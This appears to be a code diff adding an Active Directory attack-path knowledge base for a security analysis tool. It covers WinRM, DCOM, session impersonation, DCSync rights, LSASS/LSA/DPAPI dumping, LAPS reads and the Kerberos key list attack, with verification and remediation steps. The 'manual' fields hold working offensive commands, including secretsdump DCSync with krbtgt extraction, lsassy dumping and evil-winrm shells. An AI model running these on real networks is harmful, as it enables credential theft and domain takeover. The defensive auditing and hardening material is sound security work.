+            "nxc winrm {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == remote exec allowed\n"
+            "nxc winrm {target} -u <user> -p <pass> -d <domain> -x 'whoami /all'\n"
+            "# Or open an interactive remote shell:\n"
+            "evil-winrm -i {target} -u <user> -p <pass>"
+        ),
+        "verify_windows": (
+            "List who may connect over WinRM — the local Remote Management Users "
+            "group plus local Administrators:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ Get-LocalGroupMember -Group 'Remote Management Users' }}\n"
+            "# Confirm the WinRM service is listening and inspect the endpoint ACL:\n"
+            "Test-WSMan -ComputerName {target}\n"
+            "Get-PSSessionConfiguration -Name Microsoft.PowerShell | "
+            "Select-Object -ExpandProperty Permission"
+        ),
+        "verify_linux": (
+            "Non-destructive check that the account is permitted a WinRM session "
+            "(no command run):\n"
+            "nxc winrm {target} -u <user> -p <pass> -d <domain>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
+        ),
+        "remediation": (
+            "Audit the Remote Management Users group on the host and remove principals that do not need remote PowerShell: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Management Users' }.",
+            "Restrict the PowerShell endpoint permission (Get-PSSessionConfiguration | Set-PSSessionConfiguration) to the specific administration group, and prefer constrained (JEA) session configurations that expose only the cmdlets a role needs.",
+            "Limit which source hosts may reach TCP 5985/5986 through the host firewall, and require HTTPS (5986) so remoting credentials and traffic are encrypted end to end.",
+            "Enable PowerShell script-block and module logging (Event ID 4104) plus WinRM operational logging so remote execution is recorded, and enforce tier separation so Tier-0 accounts never remote into member servers.",
+        ),
+    },
+    "executedcom": {
+        "short": (
+            "{source} can trigger remote code execution on {target} through a DCOM "
+            "object, running commands via an RPC channel with a lighter footprint "
+            "than a service install."
+        ),
+        "long": (
+            "Distributed COM lets one host instantiate and drive COM objects on "
+            "another. Several shipped objects (for example the MMC20.Application "
+            "class or the ShellWindows/ShellBrowserWindow objects) expose methods "
+            "that ultimately spawn a process, so an account with local administrator "
+            "rights on {target} — here {source} — can call one of those methods "
+            "over the DCE/RPC endpoint and have it launch a command for it. DCOM "
+            "execution does not install a service (unlike the classic PsExec route) "
+            "and its RPC signatures are less widely alerted on, which makes it a "
+            "quieter lateral-movement primitive on hosts running an EDR that "
+            "baselines service creation. The prerequisite is the same as most "
+            "member-server code execution: administrative access on the target, "
+            "reachable over RPC (TCP 135 plus the dynamic port range)."
+        ),
+        "manual": (
+            "# Execute a command through a DCOM object on the target (admin required):\n"
+            "impacket-dcomexec -object MMC20 <domain>/<user>:<pass>@{target} 'whoami'\n"
+            "#   (or)  impacket-dcomexec -object ShellWindows -k -no-pass <domain>/<user>@{target} 'whoami'"
+        ),
+        "verify_windows": (
+            "Confirm the account is a local admin (the prerequisite) and inspect "
+            "the DCOM launch/activation ACL on the target:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ Get-LocalGroupMember -Group 'Administrators' }}\n"
+            "# Review DCOM defaults and per-AppID permissions with the DCOM Config UI:\n"
+            "dcomcnfg   # Component Services > Computers > My Computer > COM Security"
+        ),
+        "verify_linux": (
+            "Confirm remote code-execution reach over the target (admin marker), "
+            "read-only:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == exec-capable\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dcom"
+        ),
+        "remediation": (
+            "Remove unnecessary local administrator rights on the host (the prerequisite for DCOM execution): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
+            "Tighten DCOM launch and activation permissions via dcomcnfg (Component Services > DCOM Config) so only required identities can remotely activate COM objects, and remove Everyone/Authenticated Users from Remote Launch/Remote Activation where present.",
+            "Restrict RPC exposure: limit which source hosts may reach TCP 135 and the dynamic RPC range through host firewall rules and network segmentation.",
+            "Monitor Event ID 4688 (process creation) for anomalous children of dllhost.exe / mmc.exe / explorer.exe on servers, which is the signature of DCOM-driven execution, and correlate with Event 4624 network logons.",
+        ),
+    },
+    "hassession": {
+        "short": (
+            "A high-value user has an active logon session on {target}, so an "
+            "attacker with admin on that host can impersonate them by scheduling a "
+            "task under their session and inherit their privileges."
+        ),
+        "long": (
+            "When a privileged user logs on to a member server or workstation, their "
+            "logon session and cached credentials live on that host for the life of "
+            "the session. If an attacker already holds administrator rights on "
+            "{target} — the host where {target} maintains a session — it can "
+            "impersonate that user without ever knowing their password: it registers "
+            "a scheduled task whose principal is the target user's interactive logon "
+            "session, and when the task runs it executes as that user. This turns a "
+            "member-server compromise into control of whichever high-value account "
+            "happened to be logged on there, which is exactly why exposed Tier-0 "
+            "sessions on Tier-1/Tier-2 hosts are so dangerous. The session is "
+            "discovered by enumerating logged-on users on the host; the abuse needs "
+            "local admin plus the Task Scheduler RPC interface reachable on the "
+            "target."
+        ),
+        "manual": (
+            "# Enumerate active sessions to find which privileged user is logged on:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
+            "# With admin on the host, register a task under that user's session to\n"
+            "# impersonate them (Task Scheduler RPC over SMB):\n"
+            "impacket-atexec -k -no-pass <domain>/<user>@{target} 'whoami'"
+        ),
+        "verify_windows": (
+            "List the interactive sessions on the host to confirm a high-value user "
+            "is logged on:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ query user }}\n"
+            "# Or enumerate logon sessions and their principals:\n"
+            "Get-CimInstance -ClassName Win32_LoggedOnUser -ComputerName {target} |\n"
+            "  Select-Object Antecedent"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of who is currently logged on to the host:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
+        ),
+        "remediation": (
+            "Enforce tier separation (ESAE): Tier-0 accounts (Domain Admins, Enterprise Admins) must never log on interactively to Tier-1/Tier-2 hosts, so their sessions and cached credentials are never exposed where a member-server compromise can reach them.",
+            "Add high-value accounts to the Protected Users group, which prevents credential caching and delegation of those accounts on the hosts they touch.",
+            "Configure 'Deny log on locally' and 'Deny log on through Remote Desktop Services' user-rights GPOs for Tier-0 groups on all non-Tier-0 systems.",
+            "Monitor Event ID 4698 (scheduled task created) and 4624/4672 (privileged logon) on member servers; a task registered under another user's session, or a Tier-0 logon to a workstation, should be investigated immediately.",
+        ),
+    },
+    "scheduledtask": {
+        "short": (
+            "With admin on {target}, an attacker registers a scheduled task whose "
+            "principal is a logged-on user's session, so the task runs as that user "
+            "and impersonates them."
+        ),
+        "long": (
+            "The Windows Task Scheduler can register a task to run in the context of "
+            "an existing interactive logon session. An attacker holding "
+            "administrator rights on {target} uses this as an impersonation "
+            "primitive: it creates a task bound to the logon session of a user who "
+            "is currently signed in — for example a privileged operator — and when "
+            "the task fires it executes with that user's token and privileges, "
+            "without the attacker ever recovering a password or hash. It is the "
+            "concrete abuse behind an observed high-value session on a host: local "
+            "admin plus the Task Scheduler RPC interface is enough to convert "
+            "'someone privileged is logged on here' into 'I am now acting as that "
+            "someone'. The technique is a standard lateral-movement / privilege-"
+            "inheritance step once a member server is under control."
+        ),
+        "manual": (
+            "# Register + run a task under the target host (Task Scheduler RPC over SMB):\n"
+            "impacket-atexec -k -no-pass <domain>/<user>@{target} 'whoami'\n"
+            "#   (or, to impersonate a specific logged-on user's session, schtasks the\n"
+            "#    task with that session's principal once admin is established)"
+        ),
+        "verify_windows": (
+            "Inspect scheduled tasks on the host and the principal each runs as — "
+            "a task bound to a user session that no admin created is suspicious:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock "
+            "{{ Get-ScheduledTask | Select-Object TaskName, "
+            "@{{n='RunAs';e={{$_.Principal.UserId}}}} }}\n"
+            "# Confirm who is logged on (the impersonation target):\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock {{ query user }}"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of logged-on users (the impersonation targets) "
+            "on the host:\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> --loggedon-users\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
+        ),
+        "remediation": (
+            "Restrict local administrator rights on the host (the prerequisite): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }, removing every principal that does not require them.",
+            "Enforce tier separation so privileged accounts do not maintain interactive sessions on member servers where a local-admin compromise could impersonate them via a scheduled task.",
+            "Enable Task Scheduler operational logging and audit task creation (Event ID 4698); alert on tasks whose principal is a logged-on user session and that were not created by a change-managed process.",
+            "Add high-value accounts to Protected Users and apply 'Deny log on locally' GPOs for Tier-0 groups on non-Tier-0 hosts to shrink the set of sessions worth impersonating.",
+        ),
+    },
+    "getchanges": {
+        "short": (
+            "{source} holds the DS-Replication-Get-Changes right on {target}; on its "
+            "own it is partial, but combined with Get-Changes-All it enables DCSync "
+            "to replicate secrets."
+        ),
+        "long": (
+            "DCSync abuses the directory replication protocol (MS-DRSR) that domain "
+            "controllers use to synchronise with one another: a principal holding "
+            "the replication control-access rights can ask a DC to replicate "
+            "account data as if it were another DC, receiving credential material "
+            "without touching the ntds.dit file directly. DS-Replication-Get-Changes "
+            "is the FIRST of the two rights that combine to make this possible — by "
+            "itself it authorises replication of standard object attributes but not "
+            "the secret attributes. It becomes dangerous when {source_type} {source} "
+            "ALSO holds DS-Replication-Get-Changes-All on {target} (the domain "
+            "object): the pair together lets the replication request pull secret "
+            "attributes such as password hashes. This right is normally held only by "
+            "Domain Controllers, Domain Admins, and Enterprise Admins, so finding it "
+            "granted to any other principal on the domain head is a serious "
+            "misconfiguration."
+        ),
+        "manual": (
+            "# With the replication rights, replicate a specific account's secrets:\n"
+            "impacket-secretsdump -k -no-pass -just-dc-user <target-account> <domain>/<user>@<dc_fqdn>\n"
+            "#   (or the whole directory)  impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
+        ),
+        "verify_windows": (
+            "Read the domain head's ACL and list every principal granted the "
+            "Get-Changes replication right — only DCs/DA/EA should appear:\n"
+            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ObjectType -eq "
+            "'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
+            "# (GUID 1131f6aa-... = DS-Replication-Get-Changes)"
+        ),
+        "verify_linux": (
+            "Enumerate who holds the replication rights over the domain object "
+            "(read-only ACL analysis):\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object <domain-DN> --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
+        ),
+        "remediation": (
+            "List every principal holding the replication rights on the domain object and remove any that is not a Domain Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -in '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }.",
+            "Revoke the delegated ACE with dsacls on the domain head (dsacls \"<domain-DN>\" /R \"<principal>\") so only the built-in Domain Controllers group, Domain Admins, and Enterprise Admins retain Get-Changes / Get-Changes-All.",
+            "Investigate how the right was delegated (a misconfigured GPO, an over-broad delegation wizard run, or a legacy sync account) and correct the source so it is not re-applied.",
+            "Enable directory-service-access auditing and alert on Event ID 4662 with the replication access mask from any principal that is not a domain controller — that is the DCSync signature.",
+        ),
+    },
+    "getchangesall": {
+        "short": (
+            "{source} holds DS-Replication-Get-Changes-All on {target} — the right "
+            "that unlocks SECRET attributes in replication, so paired with "
+            "Get-Changes it enables full DCSync of password hashes."
+        ),
+        "long": (
+            "DS-Replication-Get-Changes-All is the SECOND and decisive replication "
+            "control-access right in the DCSync pair. Where plain Get-Changes "
+            "authorises replication of ordinary attributes, Get-Changes-All is what "
+            "authorises replication of the SECRET attributes — unicodePwd, the NTLM "
+            "and Kerberos keys, supplemental credentials — for any account in the "
+            "domain, including krbtgt. When {source_type} {source} holds this right "
+            "on {target} (the domain object) together with Get-Changes, it can issue "
+            "a replication request over MS-DRSR and receive every credential hash in "
+            "the directory without dumping ntds.dit on disk. Extracting the krbtgt "
+            "key from that data is full, persistent domain compromise (Golden "
+            "Tickets). This right is meant to exist only on Domain Controllers, "
+            "Domain Admins, and Enterprise Admins, so its presence on any other "
+            "principal is the highest-severity ACL finding on the domain head."
+        ),
+        "manual": (
+            "# Full DCSync of the directory (both rights present):\n"
+            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>\n"
+            "#   (target only krbtgt for a Golden Ticket key)\n"
+            "impacket-secretsdump -k -no-pass -just-dc-user krbtgt <domain>/<user>@<dc_fqdn>"
+        ),
+        "verify_windows": (
+            "List principals granted the Get-Changes-All replication right on the "
+            "domain head — only DCs/DA/EA should appear:\n"
+            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ObjectType -eq "
+            "'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
+            "# (GUID 1131f6ad-... = DS-Replication-Get-Changes-All)"
+        ),
+        "verify_linux": (
+            "Enumerate who holds the Get-Changes-All right over the domain object "
+            "(read-only ACL analysis):\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object <domain-DN> --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
+        ),
+        "remediation": (
+            "Enumerate every principal holding Get-Changes-All on the domain object and remove any that is not a Domain Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }.",
+            "Revoke the offending ACE with dsacls (dsacls \"<domain-DN>\" /R \"<principal>\") so replication of secret attributes is restricted to Domain Controllers, Domain Admins, and Enterprise Admins.",
+            "Because this right permits krbtgt extraction, treat any past exposure as full domain compromise: after removing the ACE, rotate the krbtgt account password twice (with the replication interval between resets) to invalidate any forged Golden Tickets.",
+            "Alert on Event ID 4662 carrying the replication access mask from any non-DC principal, and correct the delegation source (GPO / delegation wizard / legacy account) that granted the right.",
+        ),
+    },
+    "getchangesinfilteredset": {
+        "short": (
+            "{source} holds DS-Replication-Get-Changes-In-Filtered-Set on {target}, "
+            "a supplemental replication right that exposes filtered-attribute-set "
+            "data (e.g. LAPS) some directories protect from ordinary DCSync."
+        ),
+        "long": (
+            "The Filtered Attribute Set (FAS) is a group of confidential attributes "
+            "that domain controllers do NOT replicate to Read-Only Domain "
+            "Controllers, and that plain DCSync (Get-Changes + Get-Changes-All) does "
+            "not necessarily return. DS-Replication-Get-Changes-In-Filtered-Set is "
+            "the extra control-access right that authorises replication of that "
+            "filtered set. It matters because confidential secrets — notably the "
+            "LAPS local-admin password attribute and other sensitive custom "
+            "attributes — can live in the FAS. When {source_type} {source} holds "
+            "this right on {target} in addition to the standard replication rights, "
+            "its DCSync can also pull the filtered attributes, widening the secret "
+            "exposure beyond ordinary account hashes. Like the other two "
+            "replication rights it is intended for Domain Controllers only, so a "
+            "delegation of it to any other principal is a misconfiguration to "
+            "correct."
+        ),
+        "manual": (
+            "# With all replication rights, a directory dump can also return the\n"
+            "# filtered-set attributes (e.g. LAPS) alongside account hashes:\n"
+            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>\n"
+            "#   (LAPS password attribute is exposed to the same replication reach)"
+        ),
+        "verify_windows": (
+            "List who holds the Get-Changes-In-Filtered-Set right on the domain "
+            "head — only Domain Controllers should:\n"
+            "(Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ObjectType -eq "
+            "'89e95b76-444d-4c62-991a-0facbeda640c' }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights\n"
+            "# (GUID 89e95b76-... = DS-Replication-Get-Changes-In-Filtered-Set)"
+        ),
+        "verify_linux": (
+            "Read-only ACL analysis of who holds the filtered-set replication right "
+            "over the domain object:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object <domain-DN> --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
+        ),
+        "remediation": (
+            "Enumerate every principal granted DS-Replication-Get-Changes-In-Filtered-Set on the domain object and remove any non-Domain-Controller: (Get-Acl \"AD:$((Get-ADDomain).DistinguishedName)\").Access | Where-Object { $_.ObjectType -eq '89e95b76-444d-4c62-991a-0facbeda640c' }.",
+            "Revoke the delegated ACE with dsacls on the domain head so the filtered-set replication right is restricted to Domain Controllers alongside the other two replication rights.",
+            "Because the filtered set can carry LAPS and other confidential attributes, rotate any LAPS-managed local passwords that were exposed while the right was misconfigured (Reset-AdmPwdPassword / Reset-LapsPassword).",
+            "Audit Event ID 4662 for replication access from non-DC principals and correct the delegation source that granted the right.",
+        ),
+    },
+    "dumplsa": {
+        "short": (
+            "With SYSTEM on {target}, an attacker reads the LSA secrets from the "
+            "SECURITY registry hive, recovering service-account passwords, cached "
+            "credentials, and the host's own machine-account key."
+        ),
+        "long": (
+            "The Local Security Authority stores a set of persistent secrets in the "
+            "SECURITY registry hive: the plaintext passwords of services configured "
+            "to run as a domain account, DPAPI machine keys, auto-logon "
+            "credentials, and the computer's own machine-account key. An attacker "
+            "who reaches SYSTEM on {target} can read the SECURITY and SYSTEM hives "
+            "and decrypt these LSA secrets offline. This is a distinct source from "
+            "LSASS process memory: LSA secrets are on disk in the registry and "
+            "survive reboots, so they yield persistent service-account and "
+            "machine-account credentials even when no interesting user is currently "
+            "logged on. A recovered service-account password is often a domain "
+            "credential that unlocks further lateral movement, and the "
+            "machine-account key enables Kerberos actions as the host. The "
+            "prerequisite is administrative (SYSTEM) access on the target."
+        ),
+        "manual": (
+            "# Read LSA secrets remotely (recovers service-account + machine-account keys):\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> --lsa\n"
+            "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass <domain>/<user>@<target-fqdn>"
+        ),
+        "verify_windows": (
+            "Confirm the account is a local admin (the prerequisite) and inspect "
+            "which services run as a domain account (whose passwords are stored as "
+            "LSA secrets):\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-CimInstance "
+            "Win32_Service | Where-Object {{ $_.StartName -like '*\\\\*' }} |\n"
+            "  Select-Object Name, StartName }}"
+        ),
+        "verify_linux": (
+            "Confirm admin reach over the host (read-only marker, no dump):\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == LSA-dump-capable\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
+        ),
+        "remediation": (
+            "Inventory services running under domain accounts on the host (Get-CimInstance Win32_Service | Where-Object { $_.StartName -like '*\\*' }) and migrate them to Group Managed Service Accounts (gMSA), whose passwords are managed by the domain and never stored as recoverable LSA secrets.",
+            "Rotate every service-account password that was ever configured on a host an attacker could reach, treating the exposed values as compromised.",
+            "Restrict local administrator rights on member servers and enforce tier separation so an attacker cannot reach SYSTEM to read the SECURITY hive in the first place.",
+            "Monitor Event IDs 4656/4663 for handle/access requests to the SECURITY and SYSTEM registry hives and Event 4688 for the tooling that reads them, and alert on remote registry access outside change windows.",
+        ),
+    },
+    "dumplsass": {
+        "short": (
+            "With SYSTEM on {target}, an attacker reads the LSASS process memory and "
+            "recovers the plaintext passwords, NTLM hashes, and Kerberos tickets of "
+            "every account currently logged on."
+        ),
+        "long": (
+            "The Local Security Authority Subsystem Service (lsass.exe) holds, in "
+            "memory, the credential material of every session on the host: NTLM "
+            "hashes, Kerberos TGTs and keys, and — depending on configuration — "
+            "cleartext passwords. An attacker who reaches SYSTEM on {target} can "
+            "read that process memory and extract those credentials, immediately "
+            "harvesting the secrets of any privileged user who has logged on there. "
+            "This is the classic pivot that turns one host into many: dump LSASS on "
+            "a member server where a domain admin recently authenticated and you "
+            "hold that admin's credentials. Modern EDR in blocking mode intercepts "
+            "direct reads of LSASS, so on a monitored host this step may be blocked "
+            "or alert loudly; safer alternatives that avoid touching LSASS include "
+            "reading LSA secrets from the registry, DPAPI offline, or fetching "
+            "gMSA/LAPS material over the directory. The prerequisite is "
+            "administrative (SYSTEM) access on the target."
+        ),
+        "manual": (
+            "# Dump LSASS and parse credentials remotely (SYSTEM required):\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain> -M lsassy\n"
+            "#   (or, obtain a dump and parse offline with an LSASS parser)"
+        ),
+        "verify_windows": (
+            "Confirm the account is a local admin (the prerequisite) and check "
+            "whether LSASS is protected (RunAsPPL) and Credential Guard is enabled "
+            "— both harden this path:\n"
+            "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' "
+            "-Name RunAsPPL -ErrorAction SilentlyContinue\n"
+            "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace "
+            "root\\Microsoft\\Windows\\DeviceGuard"
+        ),
+        "verify_linux": (
+            "Confirm admin reach over the host (read-only marker, no dump):\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == LSASS-dump-capable\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass"
+        ),
+        "remediation": (
+            "Enable LSA Protection (RunAsPPL) via GPO (Computer Configuration > Policies > Administrative Templates > System > Local Security Authority) so LSASS runs as a protected process and its memory cannot be read by ordinary admin tooling.",
+            "Deploy Credential Guard on supported hosts (verified with Get-CimInstance Win32_DeviceGuard) so NTLM hashes and Kerberos keys are isolated in a virtualized secure world outside LSASS.",
+            "Enforce tier separation and add Tier-0 accounts to Protected Users so privileged credentials are never cached in LSASS on member servers where a local-admin compromise could read them.",
+            "Restrict local administrator rights and monitor Event ID 4656/4663 for process-access handles to lsass.exe with read rights, which is the credential-dumping signature.",
+        ),
+    },
+    "dumpdpapi": {
+        "short": (
+            "With admin on {target}, an attacker recovers DPAPI master keys and "
+            "decrypts the user secrets DPAPI protects — saved browser and RDP "
+            "passwords, credentials in Credential Manager, and more."
+        ),
+        "long": (
+            "The Data Protection API (DPAPI) is what Windows uses to encrypt "
+            "per-user secrets at rest: passwords saved in browsers, RDP connection "
+            "credentials, Wi-Fi keys, and anything stored via Credential Manager. "
+            "Each user's secrets are protected by a DPAPI master key, which is "
+            "itself derived from the user's password (or, for domain accounts, "
+            "recoverable via the domain's DPAPI backup key held on the DC). An "
+            "attacker with administrative access on {target} can harvest the "
+            "encrypted master keys and credential blobs from the user profile and "
+            "decrypt them — either by knowing the user's password, by extracting the "
+            "master key from LSASS while the user is logged on, or, most powerfully, "
+            "by using the domain DPAPI backup key to decrypt ANY domain user's DPAPI "
+            "secrets. This yields cleartext application and service credentials that "
+            "are invisible to hash-based defences. The prerequisite is admin on the "
+            "host holding the profile (or the domain backup key for the domain-wide "
+            "route)."
+        ),
+        "manual": (
+            "# Recover the domain DPAPI backup key (needs DA-level rights on the DC):\n"
+            "impacket-dpapi backupkeys -t <domain>/<user>:<pass>@<dc_ip> --export\n"
+            "# Decrypt a user's master key, then a credential/vault blob:\n"
+            "impacket-dpapi masterkey -file <masterkey_file> -pvk <backupkey.pvk>\n"
+            "impacket-dpapi credential -file <credential_blob> -key <decrypted_masterkey>"
+        ),
+        "verify_windows": (
+            "Confirm the account is a local admin (the prerequisite) and locate the "
+            "DPAPI master keys and credential blobs in a user profile:\n"
+            "Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-ChildItem "
+            "\"$env:APPDATA\\Microsoft\\Protect\" -Recurse -Force }}\n"
+            "# The domain DPAPI backup key lives on the DC and is DA-protected."
+        ),
+        "verify_linux": (
+            "Confirm admin reach over the host holding the profile (read-only "
+            "marker, no decryption):\n"
+            "nxc smb {target} -u <user> -p <pass> -d <domain>   # 'Pwn3d!' == DPAPI-reachable\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi"
+        ),
+        "remediation": (
+            "Protect the domain DPAPI backup key: it is stored on the domain controllers and decrypts every domain user's DPAPI secrets, so treat its exposure as domain-wide credential compromise and restrict DA-level access to DCs.",
+            "Discourage storing recoverable secrets in DPAPI-protected stores where possible — disable browser password saving via policy and prefer an enterprise secret manager for service credentials.",
+            "Enforce tier separation and Protected Users so a privileged user's DPAPI master key is not present in LSASS on member servers a local-admin compromise can reach.",
+            "Monitor Event ID 4662 for reads of the domain DPAPI backup key object (BCKUPKEY) and Event 4663 for access to the Protect\\ profile folders; alert on backup-key export outside change windows.",
+        ),
+    },
+    "synclapspassword": {
+        "short": (
+            "{source} can read or replicate the LAPS-managed local administrator "
+            "password of {target}, recovering the cleartext local admin credential "
+            "from the directory."
+        ),
+        "long": (
+            "The Local Administrator Password Solution (LAPS) stores each domain-"
+            "joined computer's randomised local administrator password in a "
+            "directory attribute on the computer object — ms-Mcs-AdmPwd for legacy "
+            "LAPS, or the msLAPS-Password / msLAPS-EncryptedPassword attributes for "
+            "Windows LAPS. Read access to that confidential attribute is meant to be "
+            "restricted to a small set of administrators, but a misconfigured ACL "
+            "can grant it to a broader principal. When {source_type} {source} can "
+            "read (or replicate) the LAPS attribute of {target}, it recovers that "
+            "host's current local administrator password in cleartext and can log on "
+            "with full local admin rights — from there dumping cached credentials "
+            "and pivoting onward. Because the password is stored in the directory, "
+            "no code execution on the target is needed: a single over-permissive "
+            "read ACE turns directory access into host compromise."
+        ),
+        "manual": (
+            "# Read the LAPS local-admin password from the computer object (legacy LAPS):\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
+            "#   (or) bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr ms-Mcs-AdmPwd"
+        ),
+        "verify_windows": (
+            "List which principals can READ the LAPS password attribute on the "
+            "computer object — only sanctioned admins should:\n"
+            "(Get-Acl \"AD:$((Get-ADComputer {target}).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ActiveDirectoryRights -match 'ReadProperty' }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n"
+            "# Or confirm the attribute is populated:\n"
+            "Get-ADComputer {target} -Properties ms-Mcs-AdmPwd, msLAPS-Password"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of who can read the LAPS attribute (no password "
+            "retrieved):\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/read-laps-password"
+        ),
+        "remediation": (
+            "Review the read ACL on the LAPS password attribute for the computer object and remove every principal that is not a sanctioned administrator: Find-AdmPwdExtendedRights -Identity <OU> (legacy LAPS) or Find-LapsADExtendedRights -Identity <OU> (Windows LAPS).",
+            "Migrate legacy Microsoft LAPS (ms-Mcs-AdmPwd, stored in cleartext in the directory) to Windows LAPS with encrypted password storage (msLAPS-EncryptedPassword) so the attribute is not readable in cleartext even by an over-permissive ACE.",
+            "Scope LAPS read delegation per-OU to the specific admin group responsible for those hosts, never to broad groups such as Authenticated Users; re-apply the delegation with Set-AdmPwdReadPasswordPermission / Set-LapsADReadPasswordPermission.",
+            "Rotate the exposed local passwords immediately (Reset-AdmPwdPassword / Reset-LapsPassword) and audit Event ID 4662 for reads of the LAPS attribute by unexpected principals.",
+        ),
+    },
+    "kerberoskeylist": {
+        "short": (
+            "Using a forged RODC golden ticket, {source} issues a Kerberos Key List "
+            "request to a writable domain controller and recovers the account's NT "
+            "hash for {target} without DCSync."
+        ),
+        "long": (
+            "A compromised Read-Only Domain Controller (or control of a per-RODC "
+            "krbtgt account) lets an attacker forge a golden ticket scoped to that "
+            "RODC. The Kerberos Key List attack then abuses a legitimate protocol "
+            "feature: presenting that ticket, {source_type} {source} sends a Key "
+            "List request (a KERB-KEY-LIST-REQ) to a writable domain controller, "
+            "which returns the long-term key — the NT hash — of the target account "
+            "{target}. This recovers credential material without a directory-"
+            "replication (DCSync) request, so it can succeed where the replication "
+            "rights are not held, and it works only when AES key material exists for "
+            "the per-RODC krbtgt account being abused. The result is an account NT "
+            "hash usable for pass-the-hash or offline cracking, and if the target is "
+            "a privileged account it is a direct escalation. The prerequisite is "
+            "control over an RODC's krbtgt secret and reachability to a writable DC."
+        ),
+        "manual": (
+            "# With a forged RODC golden ticket in the ccache, request the Key List\n"
+            "# data (NT hash) for a target account from a writable DC:\n"
+            "impacket-getST -k -no-pass -key-list <domain>/{target}\n"
+            "#   (the RODC-scoped ticket must already be present, e.g. KRB5CCNAME set)"
+        ),
+        "verify_windows": (
+            "Inspect the RODC's password-replication policy — which accounts' "
+            "secrets the RODC is allowed to cache is what bounds this attack:\n"
+            "Get-ADDomainControllerPasswordReplicationPolicy -Identity <RODC> "
+            "-Allowed\n"
+            "# Confirm the per-RODC krbtgt account and its key material:\n"
+            "Get-ADUser -Filter 'name -like \"krbtgt_*\"' -Properties "
+            "msDS-KrbTgtLinkBl"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of the RODC krbtgt accounts (no ticket forged):\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> "
+            "--query '(name=krbtgt_*)' 'name'\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/kerberos-key-list-attack"
+        ),
+        "remediation": (
+            "Harden every RODC's password-replication policy: keep the Allowed list minimal and never permit an RODC to cache Tier-0 account secrets (Get-ADDomainControllerPasswordReplicationPolicy -Identity <RODC> -Allowed / -Denied).",
